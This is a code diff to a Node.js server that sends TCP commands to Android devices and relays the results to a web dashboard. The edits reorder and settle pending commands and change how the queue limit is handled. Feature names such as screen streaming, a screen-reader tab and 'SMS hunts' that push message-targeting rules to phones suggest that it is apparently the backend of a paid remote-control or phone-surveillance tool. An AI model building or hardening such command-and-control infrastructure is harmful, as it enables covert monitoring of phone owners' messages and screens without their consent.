@@ -1162,8 +1162,9 @@ const deviceToTcp = new Map();         // deviceId → primary TCP connId
 const deviceToStreamTcp = new Map();   // deviceId → stream channel TCP connId
 /** @type {Map<string, string>} */
 const deviceToLiveTcp = new Map();     // deviceId → live channel TCP connId
-/** @type {Map<string, {sseId:string, command:string, deviceId:string, timer:NodeJS.Timeout}>} */
+/** @type {Map<string, {sseId:string, command:string, deviceId:string, timer:NodeJS.Timeout, order:number}>} */
 const pendingCmds = new Map();         // commandId → pending info
+let pendingCommandOrder = 0;
 /** @type {Map<string, Object>} In-memory device registry for when MongoDB is unavailable */
 const inMemoryDevices = new Map();     // deviceId → device object
 /** @type {Set<string>} Devices that have an active stream session */
@@ -1826,18 +1827,32 @@ async function processMessage(clientId, clientType, event, data) {
                     typeof response.framesData === 'string' ? response.framesData.length : 0} bytes base64)`);
             }
 
+            const superseded = !!(finalResponse && finalResponse.superseded === true);
             const result = { commandId, command: pending.command, deviceId,
-                             response: finalResponse, error: error || null, success: !error,
+                             response: finalResponse, error: error || null, success: !error && !superseded,
+                             superseded,
                              timestamp: new Date() };
             // Broadcast to all SSE clients so the result reaches the dashboard even if the
             // SSE connection reconnected (and got a new sseClientId) while the command was in flight.
             // This is safe for single-admin setups; in multi-user setups each client filters by deviceId.
             broadcastDash('command:result', result);
 
-            broadcastDash('activity:log', {
-                type: 'command_result', deviceId, command: pending.command,
-                commandId, success: !error, timestamp: new Date()
-            });
+            if (!superseded) {
+                broadcastDash('activity:log', {
+                    type: 'command_result', deviceId, command: pending.command,
+                    commandId, success: !error, timestamp: new Date()
+                });
+            }
+
+            // Android coalesces duplicate commands by command name.  If this
+            // response is for a real command, every older request of the same
+            // type is stale and cannot be allowed to sit in the dashboard's
+            // pending map until its timeout.  Newer requests remain pending so
+            // a command that arrived after the selected one is still allowed
+            // to produce its own response.
+            if (!superseded && pending.order) {
+                supersedeOlderPendingCommands(deviceId, pending.command, pending.order);
+            }
         }
 
         // Persist to DB fire-and-forget — never block the response pipeline on DB
@@ -3727,39 +3742,75 @@ app.get('/api/devices/:deviceId', requireUserOrAdmin, async (req, res) => {
     } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
-// ── Flush pending command queue — called automatically at limit or on demand ──
+/**
+ * Remove older requests of the same command type after a device has returned
+ * a real response.  Requests newer than the response are retained because
+ * they may have arrived after the device selected the completed command.
+ */
+function supersedeOlderPendingCommands(deviceId, command, completedOrder) {
+    const stale = [];
+    for (const [cid, pending] of pendingCmds.entries()) {
+        if (pending.deviceId === deviceId
+                && pending.command === command
+                && pending.order
+                && pending.order < completedOrder) {
+            stale.push([cid, pending]);
+        }
+    }
+
+    for (const [cid, pending] of stale) {
+        clearTimeout(pending.timer);
+        pendingCmds.delete(cid);
+        broadcastDash('command:result', {
+            commandId: cid,
+            command: pending.command,
+            deviceId: pending.deviceId,
+            success: false,
+            superseded: true,
+            error: 'Superseded by a newer command response',
+            timestamp: new Date(),
+        });
+    }
+    if (stale.length) {
+        log('CMD', `Settled ${stale.length} stale ${command} request(s) after device response for ${deviceId}`);
+    }
+}
+
+function removePendingCommands(entries, reason) {
+    for (const [cid, pending] of entries) {
+        clearTimeout(pending.timer);
+        pendingCmds.delete(cid);
+        broadcastDash('command:result', {
+            commandId: cid,
+            command: pending.command,
+            deviceId: pending.deviceId,
+            success: false,
+            superseded: true,
+            error: reason,
+            timestamp: new Date(),
+        });
+    }
+    return entries.length;
+}
+
+// ── Flush pending command queue — called on demand only ───────────────────────
 function flushPendingQueue(deviceId) {
     const toFlush = deviceId
         ? [...pendingCmds.entries()].filter(([, p]) => p.deviceId === deviceId)
         : [...pendingCmds.entries()];
+    const cleared = removePendingCommands(toFlush, 'Queue reset by operator');
 
-    for (const [cid, pending] of toFlush) {
-        clearTimeout(pending.timer);
-        if (pending.sseId) sseSend(pending.sseId, 'command:result', {
-            commandId: cid, command: pending.command, deviceId: pending.deviceId,
-            success: false, error: 'Queue reset — too many pending commands',
-            timestamp: new Date()
-        });
-        pendingCmds.delete(cid);
-    }
-
-    if (toFlush.length) {
-        log('CMD', `Queue flushed — cleared ${toFlush.length} pending commands${deviceId ? ' for ' + deviceId : ''}`, 'warn');
-        broadcastDash('queue:reset', { deviceId: deviceId || null, cleared: toFlush.length, timestamp: new Date() });
-
-        // Signal the device to reset its connection so it reconnects cleanly
-        const targets = deviceId ? [deviceId] : [...new Set(toFlush.map(([, p]) => p.deviceId))];
-        for (const did of targets) {
-            const tcpId = deviceToTcp.get(did);
-            const tc    = tcpId ? tcpClients.get(tcpId) : null;
-            if (tc && tc.writable) {
-                tcpSend(tc, 'connection:reset', { reason: 'queue_overflow', timestamp: Date.now() });
-            }
-        }
+    if (cleared) {
+        log('CMD', `Queue flushed — cleared ${cleared} pending commands${deviceId ? ' for ' + deviceId : ''}`, 'warn');
+        broadcastDash('queue:reset', { deviceId: deviceId || null, cleared, timestamp: new Date() });
     }
 }
 
-const PENDING_CMD_LIMIT = 39;
+// This is only a final safety valve for many different command types.  Duplicate
+// command types are coalesced by the device/response logic and normally never
+// reach this limit.  Do not reset the TCP connection when it is reached: doing
+// so can discard a command that is already executing and create more retries.
+const PENDING_CMD_LIMIT = 256;
 
 app.post('/api/commands', requireUserOrAdmin, requireActiveSubscription, async (req, res) => {
     const { deviceId, command, sseClientId } = req.body;
@@ -3789,26 +3840,27 @@ app.post('/api/commands', requireUserOrAdmin, requireActiveSubscription, async (
         return res.json({ success: true, command, deviceId, status: 'reset_sent', timestamp: new Date() });
     }
 
-    // ── Queue overflow protection: flush at PENDING_CMD_LIMIT ──
-    const devicePendingCount = [...pendingCmds.values()].filter(p => p.deviceId === deviceId).length;
-    if (devicePendingCount >= PENDING_CMD_LIMIT) {
-        flushPendingQueue(deviceId);
-        return res.status(429).json({
-            error: `Queue limit (${PENDING_CMD_LIMIT}) reached — queue has been reset. Retry your command.`,
-            queueReset: true, deviceId
-        });
+    // ── Safety valve for many different command types ─────────────────────
+    // Keep the device connection alive and evict only the oldest waiters.  A
+    // connection reset here used to make the device reconnect while commands
+    // were still executing, which caused another burst of duplicate requests.
+    const devicePending = [...pendingCmds.entries()]
+        .filter(([, p]) => p.deviceId === deviceId);
+    if (devicePending.length >= PENDING_CMD_LIMIT) {
+        const evictCount = devicePending.length - PENDING_CMD_LIMIT + 1;
+        const oldest = devicePending
+            .sort((a, b) => (a[1].order || 0) - (b[1].order || 0))
+            .slice(0, evictCount);
+        removePendingCommands(oldest, 'Superseded to protect the device command channel');
     }
 
     const commandId = crypto.randomBytes(12).toString('hex');
+    const order = ++pendingCommandOrder;
 
-    // Forward to device immediately — no queue, fire and forget over TCP
-    tcpSend(tcpConn, 'command:execute', { commandId, command, params: params || null });
-
-    // Track streaming state so we can auto-resume after stream channel reconnects
-    if (command === 'stream_start')  deviceStreamingState.add(deviceId);
-    if (command === 'stream_stop')   deviceStreamingState.delete(deviceId);
-
-    // Track pending so command:response can route the result back via SSE
+    // Install the pending entry before writing to TCP.  A fast device can
+    // answer synchronously enough that the response event reaches Node before
+    // tcpSend() returns; registering afterwards loses that response and leaves
+    // a phantom waiter until timeout.
     const timer = setTimeout(() => {
         if (pendingCmds.has(commandId)) {
             pendingCmds.delete(commandId);
@@ -3819,7 +3871,20 @@ app.post('/api/commands', requireUserOrAdmin, requireActiveSubscription, async (
             });
         }
     }, CMD_TIMEOUT_MS);
-    pendingCmds.set(commandId, { sseId: sseClientId || null, command, deviceId, timer });
+    pendingCmds.set(commandId, {
+        sseId: sseClientId || null,
+        command,
+        deviceId,
+        timer,
+        order,
+    });
+
+    // Forward to device immediately — no queue, fire and forget over TCP
+    tcpSend(tcpConn, 'command:execute', { commandId, command, params: params || null });
+
+    // Track streaming state so we can auto-resume after stream channel reconnects
+    if (command === 'stream_start')  deviceStreamingState.add(deviceId);
+    if (command === 'stream_stop')   deviceStreamingState.delete(deviceId);
 
     // Respond immediately — command already sent to device via TCP
     res.json({ success: true, commandId, command, deviceId, params, status: 'executing', timestamp: new Date() });
@@ -3860,6 +3925,18 @@ app.post('/api/device/:deviceId/reset-session', async (req, res) => {
             pendingCmds.delete(cid);
             cleared++;
         }
+    }
+    if (cleared) {
+        // The screen-reader tab uses this endpoint when it opens.  Tell every
+        // dashboard instance to clear its local pending indicators as well;
+        // otherwise the server is clean while an old browser still displays
+        // hundreds of phantom waiters.
+        broadcastDash('queue:reset', {
+            deviceId,
+            cleared,
+            reason: 'device session reset',
+            timestamp: new Date(),
+        });
     }
 
     // 2. Remove from active streaming set
@@ -3906,19 +3983,7 @@ async function syncSmsHuntsToDevice(deviceId, clearSchedules = false) {
         .sort({ updatedAt: -1 })
         .lean();
     const commandId = crypto.randomBytes(12).toString('hex');
-    tcpSend(conn, 'command:execute', {
-        commandId,
-        command: 'set_sms_hunts',
-        params: {
-            hunts: hunts.map(hunt => ({
-                huntId: String(hunt._id),
-                name: hunt.name,
-                targetMode: hunt.targetMode,
-                target: hunt.target,
-                enabled: hunt.enabled !== false,
-            })),
-        },
-    });
+    const order = ++pendingCommandOrder;
     // Automatic syncs (save/edit and reconnect) must be observable by the
     // dashboard just like a manually sent command.  Without a pending entry,
     // the device acknowledgement is persisted but silently dropped before it
@@ -3940,6 +4005,20 @@ async function syncSmsHuntsToDevice(deviceId, clearSchedules = false) {
         command: 'set_sms_hunts',
         deviceId,
         timer,
+        order,
+    });
+    tcpSend(conn, 'command:execute', {
+        commandId,
+        command: 'set_sms_hunts',
+        params: {
+            hunts: hunts.map(hunt => ({
+                huntId: String(hunt._id),
+                name: hunt.name,
+                targetMode: hunt.targetMode,
+                target: hunt.target,
+                enabled: hunt.enabled !== false,
+            })),
+        },
     });
     new Command({
         id: commandId,
